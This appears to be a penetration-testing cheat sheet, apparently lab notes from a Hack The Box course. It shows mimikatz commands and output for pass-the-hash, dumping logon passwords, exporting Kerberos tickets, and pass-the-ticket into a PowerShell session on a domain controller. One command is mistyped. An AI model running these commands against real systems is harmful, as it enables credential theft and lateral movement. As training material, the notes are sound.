mimikatz
#########

Date: 2024-11-23 09:40

Status:

Description
*************

A tool for the Windows platform that can: - extract plaintext passwords
- extract hashes and PINS - perform Pass-the-hash - perform pass-the-pin
- build golden tickets

Installation
**************

Binaries for mimikatz can be found at:
https://github.com/gentilkiwi/mimikatz/releases

Usage
****** 

Pass the hash
================

Example 1: Simulate another user and run a shell

.. code-block:: console

   mimikatz.exe privilege::debug "sekurslas::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit"

Dump credentials
====================

Example 1: Dumping all logon passwords

.. code-block:: console 

   mimikatz # privilege::debug
   mimikatz # sekurlsa::logonPasswords full

Harvest All Kerberose Tickets
================================

Example 1: Requires local admin privileges

.. code-block:: console

   mimikatz # privilege::debug
   mimikatz # sekurlsa::tickets /export

Pass the Ticket for lateral movement
======================================

.. code-block:: console

   mimikatz # privilege::debug
   Privilege '20' OK

   mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"

   * File: 'C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi': OK

   mimikatz # exit
   Bye!

   c:\tools>powershell
   Windows PowerShell
   Copyright (C) 2015 Microsoft Corporation. All rights reserved.

   PS C:\tools> Enter-PSSession -ComputerName DC01
   [DC01]: PS C:\Users\john\Documents> whoami
   inlanefreight\john
   [DC01]: PS C:\Users\john\Documents> hostname
   DC01
   [DC01]: PS C:\Users\john\Documents>

References
**************
https://github.com/gentilkiwi
https://academy.hackthebox.com/module/147/section/1638
